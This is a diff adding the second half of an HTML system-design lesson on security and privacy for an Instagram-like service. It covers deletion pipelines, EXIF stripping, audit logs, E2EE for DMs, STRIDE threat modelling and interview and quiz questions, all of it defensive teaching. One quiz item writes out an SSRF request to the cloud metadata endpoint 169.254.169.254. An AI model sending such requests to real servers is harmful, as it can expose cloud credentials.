+  <g stroke="#555" stroke-width="1.3" fill="none" marker-end="url(#ar-sec-2)">
+    <path d="M135,165 L163,165"/><path d="M305,165 L333,165"/>
+    <path d="M445,160 L480,25"/><path d="M445,162 L480,63"/><path d="M445,164 L480,101"/><path d="M445,165 L480,139"/>
+    <path d="M445,166 L480,177"/><path d="M445,168 L480,215"/><path d="M445,170 L480,253"/><path d="M445,172 L480,291"/>
+    <path d="M678,150 L696,150"/><path d="M678,225 L696,225"/>
+    <path d="M305,270 L305,202" stroke-dasharray="4 3"/>
+  </g>
+</svg>
+<div class="caption">Account deletion fans out through Kafka to a deletion handler for every store. A verifier independently checks that nothing was missed; backups and logs are handled by retention and crypto-shredding.</div>
+</div>
+<ol class="steps">
+  <li><strong>Immediately hide</strong>: mark the account deactivated so its profile, posts and comments stop being served (API checks the flag). Optionally start a <strong>grace period</strong> during which the user can cancel — Meta's help pages describe a 30-day window for Instagram account deletion, after which deletion proceeds and can take up to about 90 days to complete across systems.</li>
+  <li><strong>Record in a deletion ledger</strong> (durable, idempotent), then publish a <code>user_deleted</code> event.</li>
+  <li><strong>Each owning service deletes its data</strong>: user row and credentials; posts, comments and likes (and decrement counters); media objects and all renditions; CDN purge for cached URLs (signed URLs expire anyway); remove the user's posts from followers' Redis timelines lazily or by filtering on read; delete documents from the search index; follow edges; DM content per the product's rules.</li>
+  <li><strong>Analytics and ML</strong>: row-level deletes in lake tables (table formats like Iceberg/Delta support them), drop rows from feature stores; exclude the user from future training sets; pseudonymise where full deletion isn't feasible and the law allows.</li>
+  <li><strong>Backups</strong>: either rely on bounded backup retention (e.g. backups expire after N days, documented in the privacy policy) with a process to re-apply deletions if a backup is ever restored, or <strong>crypto-shred</strong> by destroying the user's per-user encryption key.</li>
+  <li><strong>Logs</strong>: short retention; user identifiers pseudonymised in long-lived logs.</li>
+  <li><strong>Verify</strong>: an independent reconciliation job scans stores for data belonging to deleted users, and per-store deletion SLAs are monitored. Every new data store must register a deletion handler before launch — otherwise it becomes a silent compliance gap.</li>
+</ol>
+<p>Deletion must be <strong>idempotent and retryable</strong> (handlers will crash halfway), and it must be designed for scale: deleting a celebrity's account touches hundreds of millions of timelines and likes, so it runs as throttled background work.</p>
+
+<h3>12.3 Data minimisation and EXIF stripping</h3>
+<p>The safest data is data you never collect. <strong>Data minimisation</strong> means collecting only what a feature needs, keeping it only as long as needed, and limiting who and what can access it. Concrete examples:</p>
+<ul>
+  <li><strong>EXIF stripping</strong>: phone photos embed EXIF metadata — GPS coordinates (precisely where the photo was taken — often someone's home), device model, serial numbers, timestamps. Instagram is widely reported to remove this metadata from published images; the media pipeline's re-encoding step (section 8) naturally drops it. Any location a user <em>chooses</em> to tag is stored separately and explicitly.</li>
+  <li><strong>Retention limits</strong>: raw IP addresses and precise location in logs kept for days, not years; analytics on pseudonymous IDs.</li>
+  <li><strong>Don't log content</strong>: no message bodies, passwords or tokens in logs or analytics events (see <a href="observability.html">Observability</a>).</li>
+  <li><strong>Field-level visibility</strong>: APIs return contact information only to those entitled to see it.</li>
+</ul>
+
+<h2>13. Audit logs</h2>
+<p>An <strong>audit log</strong> records security-relevant actions: who (human or service) did what to which resource, when, from where, and why (justification/ticket). Examples: an employee viewing a user's account in an internal tool; a change to a user's email; a KMS decrypt of a sensitive key; a permission grant; a data export.</p>
+<ul>
+  <li><strong>Append-only and tamper-evident</strong>: written to a separate system that the actors being audited can't modify (write-once storage, hash-chaining entries so deletions are detectable).</li>
+  <li><strong>Separate from debugging logs</strong>: different retention (often years), access and integrity requirements.</li>
+  <li><strong>Actively reviewed</strong>: anomaly detection (an employee viewing many celebrity accounts), periodic access reviews, and investigation support after an incident.</li>
+  <li><strong>User-facing audit</strong>: Instagram's "Login activity" and security notifications are audit logs surfaced to users.</li>
+</ul>
+
+<h2>14. End-to-end encryption for DMs</h2>
+<p>With TLS + encryption at rest, Instagram's servers can still read DMs (they hold the keys). <strong>End-to-end encryption (E2EE)</strong> means only the sender's and recipients' devices hold the keys; the server relays ciphertext it cannot decrypt — protecting messages even from a breach of the server or from insider access.</p>
+<pre class="ascii">
+ Alice's phone                         Instagram servers                        Bob's phone
+ ─────────────                         ─────────────────                        ───────────
+ fetch Bob's public prekey bundle ◄──── key directory (public keys only)
+ X3DH key agreement → shared secret
+ Double Ratchet: new key per message
+ encrypt("see you at 7") ──────────────► store &amp; forward ciphertext ───────────► decrypt with own keys
+                                         sees: sender, recipient, time, size
+                                         cannot see: content
+</pre>
+<ul>
+  <li>The widely used design is the <strong>Signal Protocol</strong>: long-term identity keys, signed prekeys uploaded to a directory for asynchronous session setup (X3DH), and the <strong>Double Ratchet</strong> that derives a fresh key per message (forward secrecy and post-compromise security).</li>
+  <li><strong>What the server still sees</strong>: metadata — who talks to whom and when. Minimise and protect it.</li>
+  <li><strong>Hard problems</strong>: multi-device (each device has its own keys; messages are encrypted for each), message history on new devices (encrypted backups protected by a PIN/HSM-backed key vault), server-side search becomes impossible, and abuse/safety moderation must rely on user reports (which send the reported messages) and metadata signals rather than scanning content. Key verification (safety numbers) protects against a malicious key directory.</li>
+  <li>Meta made E2EE the default for personal Messenger chats in December 2023 and has publicly said it is bringing E2EE to Instagram DMs, where it has been offered as an option; see <a href="direct-messaging.html">Direct Messaging</a>.</li>
+</ul>
+
+<h2>15. Threat modelling with STRIDE</h2>
+<p><strong>Threat modelling</strong> is a structured way to ask "what can go wrong?" before building. Draw the data-flow diagram (clients, gateway, services, stores, trust boundaries), then for each element and each boundary walk through Microsoft's <strong>STRIDE</strong> categories:</p>
+<div class="table-wrap"><table>
+  <tr><th>Threat</th><th>Violates</th><th>Instagram example</th><th>Typical mitigations</th></tr>
+  <tr><td><b>S</b>poofing</td><td>Authenticity</td><td>Logging in as someone else with stuffed credentials; a rogue service calling Ranking.</td><td>2FA, anomaly detection, mTLS service identity.</td></tr>
+  <tr><td><b>T</b>ampering</td><td>Integrity</td><td>Modifying an upload in transit; altering like counts via API abuse.</td><td>TLS, signed URLs, server-side validation, integrity checks.</td></tr>
+  <tr><td><b>R</b>epudiation</td><td>Non-repudiation</td><td>An employee denies accessing a user's data.</td><td>Tamper-evident audit logs.</td></tr>
+  <tr><td><b>I</b>nformation disclosure</td><td>Confidentiality</td><td>IDOR exposing private posts; phone numbers in API responses; EXIF GPS leaks.</td><td>Authorisation checks, minimisation, encryption, EXIF stripping.</td></tr>
+  <tr><td><b>D</b>enial of service</td><td>Availability</td><td>L7 flood on search; decompression bomb on media workers.</td><td>Edge absorption, rate limits, resource limits, load shedding.</td></tr>
+  <tr><td><b>E</b>levation of privilege</td><td>Authorisation</td><td>Exploit in an image decoder gives code execution on a worker, then pivots to databases.</td><td>Sandboxing, least privilege, segmentation, patching.</td></tr>
+</table></div>
+<p>Quick guide: (1) diagram the feature and mark trust boundaries (internet ⇄ edge, service ⇄ service, service ⇄ third party); (2) list STRIDE threats per element; (3) rate them (likelihood × impact); (4) decide mitigations, accept or transfer the rest; (5) revisit when the design changes. Doing this for "import profile picture from URL" would surface SSRF immediately.</p>
+
+<h2>16. How Instagram applies security &amp; privacy</h2>
+<div class="flow">
+  <div class="fnode client">📱 App<small>pinned TLS, attestation</small></div><div class="farrow">→</div>
+  <div class="fnode edge">Edge<small>DDoS absorption, WAF</small></div><div class="farrow">→</div>
+  <div class="fnode edge">API Gateway<small>authN/Z, rate limits</small></div><div class="farrow">→<small>mTLS</small></div>
+  <div class="fnode svc">Services<small>privacy checks, least privilege</small></div><div class="farrow">→</div>
+  <div class="fnode store">Stores<small>encrypted, audited</small></div>
+</div>
+<p>Mapping the lesson onto the main architecture diagram:</p>
+<ul>
+  <li><strong>Clients</strong>: TLS with pinning; tokens stored in the OS keystore; device-integrity signals sent with sensitive actions; 2FA and login notifications.</li>
+  <li><strong>DNS / CDN / edge</strong>: anycast edge absorbs volumetric DDoS; signed, expiring media URLs; WAF and bot signals.</li>
+  <li><strong>API Gateway</strong>: authenticates every request, enforces per-user/IP/device <a href="rate-limiting.html">rate limits</a>, and rejects malformed input early.</li>
+  <li><strong>Services</strong>: centralised privacy/authorisation checks (private accounts, blocks, close friends, restricted accounts) on every read; parameterised queries; output encoding on the web.</li>
+  <li><strong>Upload &amp; media processing</strong>: pre-signed URLs with size/type constraints; sandboxed decoders; re-encoding that strips EXIF; integrity/abuse classifiers.</li>
+  <li><strong>Data layer</strong>: encryption at rest with KMS-managed keys; per-service DB grants; audit-logged employee access; backups with bounded retention.</li>
+  <li><strong>Kafka &amp; analytics</strong>: deletion events fan out to every consumer; analytics on pseudonymised IDs; abuse-detection models trained on behaviour signals.</li>
+</ul>
+<div class="callout instagram"><span class="callout-title">📸 Publicly known Instagram/Meta practices</span>
+Publicly documented features include two-factor authentication (authenticator apps, SMS, security keys), a <em>Login activity</em> page where users can see and log out sessions, security emails about new logins, a <em>Download your information</em> data export, and account deletion with a 30-day grace period (per Meta's help pages). Meta runs a long-standing public <strong>bug bounty</strong> program covering Instagram, through which researchers have reported issues such as IDOR and account-takeover bugs. Instagram is widely reported to strip location EXIF metadata from uploaded photos. Meta made E2EE the default for Messenger in 2023 and has stated plans to extend it to Instagram DMs. Internal details — exact rate limits, ML models, key hierarchies — are not public, and the designs in this lesson are reasonable assumptions.</div>
+
+<h3>Rough numbers (assumptions)</h3>
+<pre><code>Login attempts: 50k/s at peak; credential-stuffing bursts can add 10× from millions of IPs
+  → per-account + per-IP + per-device limits, plus ML risk scoring in &lt; 20 ms per login
+DDoS: 2 Tbps volumetric attack ÷ 200 anycast PoPs ≈ 10 Gbps per PoP → absorbed at the edge
+Deletion: 1M account deletions/day × ~10 stores ≈ 10M deletion tasks/day ≈ 115 tasks/s (bursty)
+KMS: envelope encryption → 1 KMS call per new object/user key, not per byte; DEKs cached briefly</code></pre>
+
+<h2>17. Trade-offs &amp; common pitfalls</h2>
+<div class="pros-cons">
+  <div class="pros"><h4>✅ Benefits</h4><ul>
+    <li>Protects users' most personal data and trust in the product</li>
+    <li>Reduces breach impact through layered defences</li>
+    <li>Keeps the service available under attack</li>
+    <li>Regulatory compliance; avoids huge fines</li>
+    <li>Healthier platform with less spam and fewer fake accounts</li>
+  </ul></div>
+  <div class="cons"><h4>⚠️ Costs</h4><ul>
+    <li>Latency and CPU overhead (TLS, mTLS, KMS calls, checks)</li>
+    <li>Friction for users (2FA, challenges) — and false positives that block real people</li>
+    <li>Engineering complexity: key management, deletion across every store</li>
+    <li>E2EE limits server features (search, moderation, history sync)</li>
+    <li>Constant arms race with attackers</li>
+  </ul></div>
+</div>
+<h4>Common pitfalls</h4>
+<ul>
+  <li><strong>Trusting the internal network</strong> or the client (client-side validation only, hidden fields, "the app would never send that").</li>
+  <li><strong>Authorisation checks scattered per endpoint</strong> — one forgotten check = IDOR. Centralise them.</li>
+  <li><strong>Secrets in code or logs</strong>; long-lived static credentials.</li>
+  <li><strong>Fetching user-supplied URLs</strong> from servers with access to internal networks (SSRF).</li>
+  <li><strong>Parsing untrusted media</strong> in unsandboxed, unpatched libraries.</li>
+  <li><strong>Deleting from the primary DB only</strong> — leaving copies in caches, search, the CDN, analytics and backups.</li>
+  <li><strong>Encryption with the key next to the data</strong>, or without rotation.</li>
+  <li><strong>Session tokens that can't be revoked</strong>, making "log out everywhere" a lie.</li>
+  <li><strong>Security as a final review step</strong> instead of threat modelling during design.</li>
+</ul>
+
+<h2>18. Real-world technologies</h2>
+<div class="table-wrap"><table>
+  <tr><th>Technology</th><th>Category</th><th>When to use</th></tr>
+  <tr><td>Let's Encrypt / ACME, internal CAs, SPIFFE/SPIRE</td><td>Certificates and workload identity</td><td>Automated TLS certificates; short-lived service identities for mTLS.</td></tr>
+  <tr><td>Envoy, Istio, Linkerd</td><td>Service mesh</td><td>Transparent mTLS and service-to-service authorisation policies.</td></tr>
+  <tr><td>AWS KMS, Google Cloud KMS, Azure Key Vault, HSMs</td><td>Key management</td><td>Master keys, envelope encryption, audit of key use.</td></tr>
+  <tr><td>HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager</td><td>Secrets management</td><td>Storing, injecting and rotating secrets; dynamic DB credentials.</td></tr>
+  <tr><td>Cloudflare, Akamai, AWS Shield + WAF, Google Cloud Armor</td><td>DDoS protection and WAF</td><td>Edge absorption and L7 filtering.</td></tr>
+  <tr><td>reCAPTCHA, hCaptcha, Cloudflare Turnstile; Play Integrity, App Attest</td><td>Bot challenges and device attestation</td><td>Adding friction for risky traffic; verifying genuine apps.</td></tr>
+  <tr><td>Argon2id / bcrypt; TOTP; WebAuthn / passkeys</td><td>Credential security</td><td>Password hashing; 2FA; phishing-resistant login.</td></tr>
+  <tr><td>Signal Protocol (libsignal)</td><td>End-to-end encryption</td><td>E2EE messaging.</td></tr>
+  <tr><td>OWASP ZAP, Burp Suite, Semgrep, CodeQL, Dependabot/Snyk, gitleaks</td><td>Security testing and scanning</td><td>Finding vulnerabilities, vulnerable dependencies and leaked secrets.</td></tr>
+  <tr><td>gVisor, Firecracker, seccomp; libFuzzer/OSS-Fuzz</td><td>Sandboxing and fuzzing</td><td>Isolating and hardening untrusted-media parsing.</td></tr>
+</table></div>
+
+<h2>19. Interview corner</h2>
+<details class="qa"><summary>How do you secure communication between Instagram's microservices?</summary>
+<p>Zero trust: every call uses mTLS with short-lived certificates carrying a service identity (SPIFFE-style), issued and rotated automatically by an internal CA, typically via a service mesh sidecar. On top of authentication, enforce authorisation policies (which services may call which methods), propagate end-user identity in a signed token for user-level checks, and log access to sensitive services. Network segmentation and least-privilege data-store credentials limit blast radius if one service is compromised.</p></details>
+<details class="qa"><summary>Explain envelope encryption and why it's used.</summary>
+<p>Data is encrypted locally with a random data key (DEK, AES-256-GCM); the DEK is encrypted ("wrapped") by a key-encryption key that never leaves the KMS/HSM, and the wrapped DEK is stored with the data. Reads unwrap the DEK through the KMS (access-controlled, audited) and cache it briefly. Benefits: bulk data never goes through the KMS (performance), KEK rotation only re-wraps small DEKs, compromise of one DEK exposes only its object, and per-user DEKs enable crypto-shredding for deletion — including copies inside backups.</p></details>
+<details class="qa"><summary>A security researcher reports they can view private accounts' photos by changing the media ID in the API. What happened and how do you fix it systemically?</summary>
+<p>An IDOR / broken access control: the endpoint fetched the object by ID without checking whether the viewer may see it. Immediate fix: add the privacy check (owner, approved follower, not blocked) and return 404. Systemic fixes: route all content reads through a centralised privacy/authorisation layer so endpoints can't forget; automated tests and static checks that every data-fetching endpoint calls it; assume IDs are guessable; audit logs to determine whether it was exploited; and a bug-bounty payout plus a postmortem.</p></details>
+<details class="qa"><summary>Design account deletion so that it satisfies GDPR's right to erasure.</summary>
+<p>Immediately deactivate (stop serving) the account, optional grace period, then a durable deletion ledger and a <code>user_deleted</code> event on Kafka. Every store owns a registered, idempotent deletion handler: User DB, Cassandra posts/comments/likes (with counter fixes), object storage media and renditions, CDN purge, Redis caches/timelines, search index, graph edges, DMs, feature store, analytics lake (row-level deletes), ML training-set exclusion; logs via short retention/pseudonymisation; backups via bounded retention with re-deletion on restore, or crypto-shredding. A reconciliation job verifies no leftovers and per-store SLAs are monitored. New stores can't launch without a deletion handler.</p></details>
+<details class="qa"><summary>How would you defend the login endpoint against credential stuffing?</summary>
+<p>Layers: rate limits per account, per IP, per device and per ASN; a risk model using IP reputation, device fingerprint/attestation, failure ratios across many accounts and velocity; step-up challenges (CAPTCHA, email/SMS code) for risky attempts instead of hard blocks; checking passwords against breached-password lists and forcing resets for known-compromised credentials; encouraging 2FA/passkeys; notifying users of new logins; and generic error messages that don't reveal whether an account exists. Monitor login success-rate anomalies globally.</p></details>
+<details class="qa"><summary>What changes in the system when DMs become end-to-end encrypted?</summary>
+<p>The server stores and forwards ciphertext and hosts a public-key directory (identity keys, signed prekeys, one-time prekeys); clients do X3DH and Double Ratchet. Multi-device needs per-device keys and fan-out encryption. Server-side features that read content — search, link previews generated on the server, spam/abuse scanning — must move to the client or rely on metadata and user reports. History on new devices needs encrypted backups with HSM-protected recovery keys. Metadata still needs protection and minimisation. Key-change notifications and safety numbers guard against a malicious directory.</p></details>
+
+<h2>20. Check your understanding</h2>
+<details class="quiz"><summary>Classify each as a confidentiality, integrity or availability problem: (a) a bot inflates like counts, (b) a SYN flood takes down the load balancers, (c) a cached private photo URL is shared publicly, (d) ransomware encrypts the user DB.</summary>
+<p>(a) <strong>Integrity</strong> (data no longer reflects reality). (b) <strong>Availability</strong>. (c) <strong>Confidentiality</strong> (mitigated by signed, expiring URLs). (d) Primarily <strong>availability</strong> (and integrity) — and confidentiality too if data is also exfiltrated, as modern ransomware usually does.</p></details>
+<details class="quiz"><summary>The "import photo from URL" feature fetches <code>http://169.254.169.254/latest/meta-data/</code> for an attacker. Name the vulnerability and three mitigations.</summary>
+<p><strong>SSRF</strong>. Mitigations: fetch through an isolated egress proxy with no internal network access; resolve and block private/loopback/link-local/metadata ranges (rechecking after redirects and pinning the resolved IP against DNS rebinding); require IMDSv2-style tokens for metadata; allow only http/https on standard ports with size/time limits.</p></details>
+<details class="quiz"><summary>A 2.4 Tbps volumetric attack hits your anycast IP announced from 300 PoPs, each with 40 Gbps of spare capacity. Do you survive, and what if you used a single data center with a 400 Gbps uplink?</summary>
+<p>Anycast spreads it to ~2.4 Tbps / 300 = <strong>8 Gbps per PoP</strong> (if evenly distributed), well under 40 Gbps — absorbed. A single 400 Gbps uplink would be saturated 6× over, and legitimate users couldn't reach you regardless of how well your servers filter. (Real distributions are uneven, so headroom matters.)</p></details>
+<details class="quiz"><summary>A user changes their password because they think they were hacked. Their stolen session on the attacker's phone keeps working for 7 days. What design mistake is this, and the fix?</summary>
+<p>Sessions/tokens weren't <strong>revocable</strong> — e.g. long-lived self-contained tokens checked only by signature. Fix: server-side session records (or a revocation list) checked by the gateway, with short-lived access tokens (minutes) and refresh tokens that are invalidated on password change and on "log out of all devices".</p></details>
+<details class="quiz"><summary>Why does re-encoding every uploaded image improve both security and privacy?</summary>
+<p>Security: output is produced by your encoder in a known-good format, so malformed structures, polyglot files and hidden payloads in the original aren't served to other users (decoding should still be sandboxed, since the exploit risk is in parsing). Privacy: re-encoding drops <strong>EXIF</strong> metadata such as GPS coordinates and device serials.</p></details>
+<details class="quiz"><summary>You delete a user's rows from PostgreSQL and Cassandra. List four other places their data probably still lives.</summary>
+<p>Any four of: object storage media and renditions; CDN caches; Redis caches and followers' timelines; Elasticsearch search index; social-graph store; DM store; analytics lake/warehouse tables; feature store and ML training sets; logs; backups and snapshots; Kafka topics within retention.</p></details>
+<details class="quiz"><summary>Apply STRIDE to the Stories "viewers list" feature (who viewed my story). Name one threat in two different categories.</summary>
+<p>Examples: <strong>Information disclosure</strong> — an IDOR lets anyone fetch another user's viewer list by story ID (fix: owner-only authorisation). <strong>Tampering</strong> — a bot inflates view counts or injects fake viewers (fix: server-side view recording with rate limits and bot detection). <strong>Denial of service</strong> — a celebrity's story with millions of viewers makes the list endpoint expensive (fix: pagination, caching, limits).</p></details>
+
+<div class="takeaways">
+  <div class="t-title">🎯 Key takeaways</div>
+  <ul>
+    <li>Security protects <strong>confidentiality, integrity and availability</strong> through <strong>layers</strong>; privacy adds purpose limitation, minimisation and user rights.</li>
+    <li>Encrypt <strong>in transit</strong> (TLS, mTLS with service identities) and <strong>at rest</strong> (AES-256 with <strong>envelope encryption</strong> via KMS); keep secrets in a manager, short-lived and rotated.</li>
+    <li>Absorb <strong>DDoS</strong> at the edge, filter with WAF and rate limits; prevent <strong>injection, XSS, CSRF, IDOR, SSRF</strong>; sandbox and re-encode untrusted media.</li>
+    <li>Apply <strong>least privilege</strong> and <strong>zero trust</strong>; fight abuse with layered signals; protect accounts with 2FA, anomaly detection and revocable sessions.</li>
+    <li>Build a <strong>deletion pipeline</strong> that reaches every store (including caches, CDN, search, analytics and backups); strip <strong>EXIF</strong>; keep tamper-evident <strong>audit logs</strong>.</li>
+    <li>Use <strong>E2EE</strong> where content must be private even from the operator, and <strong>threat-model with STRIDE</strong> at design time.</li>
+  </ul>
+</div>
+
+<h2>Related lessons</h2>
+<ul>
+  <li><a href="authentication.html">Authentication &amp; Authorization</a> — tokens, sessions, OAuth and permission checks</li>
+  <li><a href="networking-basics.html">Networking Basics</a> — how TLS works</li>
+  <li><a href="rate-limiting.html">Rate Limiting</a> — throttling abuse and L7 DDoS</li>
+  <li><a href="api-gateway.html">API Gateway</a> — where TLS, authN/Z and limits are enforced</li>
+  <li><a href="cdn.html">CDN</a> — signed URLs and edge DDoS absorption</li>
+  <li><a href="media-upload.html">Media Upload</a> and <a href="media-processing.html">Media Processing</a> — validating and safely parsing untrusted files</li>
+  <li><a href="direct-messaging.html">Direct Messaging</a> — where E2EE applies</li>
+  <li><a href="multi-region.html">Multi-Region &amp; DR</a> — data residency and backups</li>
+  <li><a href="observability.html">Monitoring, Logging &amp; Tracing</a> — keeping PII out of logs; audit vs debug logs</li>
+</ul>
+
+</article>
+<script src="../assets/concepts.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
